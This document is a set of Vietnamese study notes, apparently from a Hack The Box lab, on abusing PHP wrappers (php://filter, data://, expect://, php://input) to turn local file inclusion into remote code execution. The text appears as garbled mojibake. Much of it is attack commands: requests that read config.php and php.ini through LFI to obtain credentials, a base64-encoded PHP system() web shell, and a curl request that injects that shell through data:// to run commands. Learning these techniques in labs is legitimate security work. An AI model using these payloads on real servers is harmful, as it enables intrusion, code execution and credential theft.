PHP Wrappers lÃ  cÆ¡ cháº¿ cá»§a PHP cho phÃ©p truy cáº­p cÃ¡c luá»“ng (streams) khÃ¡c nhau ngoÃ i file há»‡ thá»‘ng thÃ´ng thÆ°á»ng.
CÃº phÃ¡p:
  scheme://target
  (vd: php://input, php://filter/...)

CÃ¡c loáº¡i Wrappers phá»• biáº¿n
  File/Stream wrappers
    file:// â†’ truy cáº­p file há»‡ thá»‘ng.
    php://input â†’ Ä‘á»c dá»¯ liá»‡u raw tá»« request body.
    php://memory / php://temp â†’ dÃ¹ng bá»™ nhá»› lÃ m stream.
  Filter wrappers
    php://filter/read=convert.base64-encode/resource=config.php
    â†’ Ä‘á»c file config.php á»Ÿ dáº¡ng Base64 (dÃ¹ng trong LFI).
  Network wrappers
    http://, ftp://, https:// â†’ truy cáº­p tÃ i nguyÃªn qua network.
  Data wrapper
    data://text/plain;base64,SGVsbG8= â†’ náº¡p dá»¯ liá»‡u inline.


There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.

Fuzzing for PHP Files
  naruto3co@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Source Code Disclosure

    Ná»™i dung nÃ y lÃ  LFI to RCE qua php:// data:// expect://

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

PHP 


Source Code Disclosure = thay vÃ¬ Ä‘á»ƒ PHP cháº¡y file, ta dÃ¹ng filter Base64 Ä‘á»ƒ xuáº¥t raw source code, rá»“i decode Ä‘á»ƒ Ä‘á»c. ÄÃ¢y lÃ  ká»¹ thuáº­t chÃ­nh Ä‘á»ƒ Ä‘á»c Ä‘Æ°á»£c mÃ£ nguá»“n .php qua LFI.

DÃ¹ng PHP Filter wrapper Ä‘á»ƒ khÃ´ng thá»±c thi code, mÃ  xuáº¥t ná»™i dung thÃ´.
  php://filter/read=convert.base64-encode/resource=config

Khi gá»i qua LFI:
  http://<SERVER_IP>/index.php?language=php://filter/read=convert.base64-encode/resource=config
  â†’ Tráº£ vá» ná»™i dung config.php á»Ÿ dáº¡ng Base64.

Giáº£i nÃ©n : echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d


Ã nghÄ©a
  Tá»« file config/source code â†’ thu Ä‘Æ°á»£c:
  ThÃ´ng tin nháº¡y cáº£m: DB credentials, API keys.
  ÄÆ°á»ng dáº«n file khÃ¡c Ä‘á»ƒ tiáº¿p tá»¥c khai thÃ¡c.

ÄÃ¢y lÃ  bÆ°á»›c quan trá»ng Ä‘á»ƒ leo thang tá»« LFI â†’ RCE.

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Data 

Ra Ä‘á»i: xuáº¥t hiá»‡n tá»« PHP 5.2.0 (phÃ¡t hÃ nh thÃ¡ng 11/2006).
TÃ i liá»‡u chÃ­nh thá»©c: PHP Manual liá»‡t kÃª data:// wrapper láº§n Ä‘áº§u trong changelog cá»§a PHP 5.2.0. Ká»ƒ tá»« Ä‘Ã³ wrapper nÃ y tá»“n táº¡i cho Ä‘áº¿n cÃ¡c phiÃªn báº£n PHP hiá»‡n Ä‘áº¡i (8.x).
Báº£n cháº¥t data:// dÃ¹ng Ä‘á»ƒ dá»¯ liá»‡u inline (ngay trong URL) thay vÃ¬ pháº£i Ä‘á»c tá»« file/HTTP.
  data://<mediatype>[;base64],<data>
NÃ³ cÃ³ thá»ƒ import code trá»±c tiáº¿p 

Äiá»u kiá»‡n : Náº¿u cÃ³ LFI vÃ  allow_url_include=On, attacker cÃ³ thá»ƒ truyá»n data:// chá»©a PHP shell â†’ thá»±c thi lá»‡nh tá»« xa.

Data Wrapper trong PHP
  Chá»©c nÄƒng: data:// wrapper cho phÃ©p include dá»¯ liá»‡u trá»±c tiáº¿p (inline data), ká»ƒ cáº£ PHP code.
  Äiá»u kiá»‡n: chá»‰ hoáº¡t Ä‘á»™ng náº¿u allow_url_include = On trong file cáº¥u hÃ¬nh PHP (php.ini).
  BÆ°á»›c Ä‘áº§u tiÃªn: dÃ¹ng LFI Ä‘á»ƒ Ä‘á»c file config (php.ini) â†’ kiá»ƒm tra xem allow_url_include cÃ³ báº­t khÃ´ng.

ğŸ‘‰ Ã nghÄ©a: Náº¿u allow_url_include Ä‘Æ°á»£c báº­t, ta cÃ³ thá»ƒ tiÃªm code qua LFI báº±ng data:// â†’ kháº£ nÄƒng cao dáº«n tá»›i Remote Code Execution (RCE).

  curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

Giáº£i mÃ£ vÃ  kiá»ƒm tra cáº¥u hÃ¬nh allow_url_include 
  naruto3co@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
  -> kiá»ƒm tra nÃ³ cÃ³ "on" k nhÃ© 

Chuáº©n bá»‹ payload 
  naruto3co@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

Táº¥n cÃ´ngggggggggggggggggggggg
  naruto3co@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
    Ä‘Ã¢y logic cá»§a nÃ³ sáº½ nhÆ° nÃ y 


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Expect

Báº£n cháº¥t
  expect:// lÃ  má»™t PHP wrapper Ä‘áº·c biá»‡t.
  Chá»©c nÄƒng: cho phÃ©p thá»±c thi trá»±c tiáº¿p lá»‡nh há»‡ thá»‘ng thÃ´ng qua URL streams.
  Hoáº¡t Ä‘á»™ng giá»‘ng nhÆ° webshell, nhÆ°ng khÃ´ng cáº§n upload shell vÃ¬ báº£n cháº¥t nÃ³ Ä‘Ã£ Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ cháº¡y command.

Äiá»u kiá»‡n sá»­ dá»¥ng
  ÄÃ¢y lÃ  external wrapper â†’ pháº£i Ä‘Æ°á»£c cÃ i Ä‘áº·t thá»§ cÃ´ng vÃ  enable trong PHP.
  Kiá»ƒm tra báº±ng cÃ¡ch Ä‘á»c file config (php.ini) qua LFI, tÃ¬m:
    extension=expect
  Náº¿u cÃ³, thÃ¬ cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ khai thÃ¡c RCE.

Kiá»ƒm tra : 
  Äá»c file php.ini
    curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
  Decode 
    naruto3co@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect






| Wrapper          | Báº£n cháº¥t / Chá»©c nÄƒng                                           | Äiá»u kiá»‡n sá»­ dá»¥ng                                                     | Khai thÃ¡c trong LFI                                                                            |
| ---------------- | -------------------------------------------------------------- | --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| **php\://input** | Cho phÃ©p Ä‘á»c **raw HTTP request body**                         | `allow_url_include = On` (máº·c Ä‘á»‹nh Off) náº¿u muá»‘n include              | Gá»­i PHP code trong body request â†’ include qua `php://input` â†’ thá»±c thi (RCE)                   |
| **data://**      | Cho phÃ©p nhÃºng dá»¯ liá»‡u/code **inline trong URL** (text/base64) | `allow_url_include = On`                                              | Inject PHP code trá»±c tiáº¿p qua `data://` (vd: `data://text/plain,<?php system('id'); ?>`) â†’ RCE |
| **expect://**    | Wrapper Ä‘á»ƒ **thá»±c thi system command** (Ä‘Æ°á»£c thiáº¿t káº¿ sáºµn)     | Cáº§n **cÃ i Ä‘áº·t & báº­t extension expect** trong PHP (`extension=expect`) | Truyá»n command trá»±c tiáº¿p qua URL, vÃ­ dá»¥ `expect://id` â†’ cháº¡y lá»‡nh trÃªn server                  |

ğŸ—ï¸ Nháº­n xÃ©t
    php://input â†’ lá»£i dá»¥ng body request lÃ m code.
    data:// â†’ lá»£i dá»¥ng inline data lÃ m code.
    expect:// â†’ lá»£i dá»¥ng wrapper Ä‘á»ƒ cháº¡y command trá»±c tiáº¿p (khÃ´ng cáº§n code PHP).
ğŸ‘‰ Cáº£ 3 Ä‘á»u cÃ³ thá»ƒ biáº¿n LFI â†’ RCE, náº¿u server cáº¥u hÃ¬nh khÃ´ng an toÃ n.



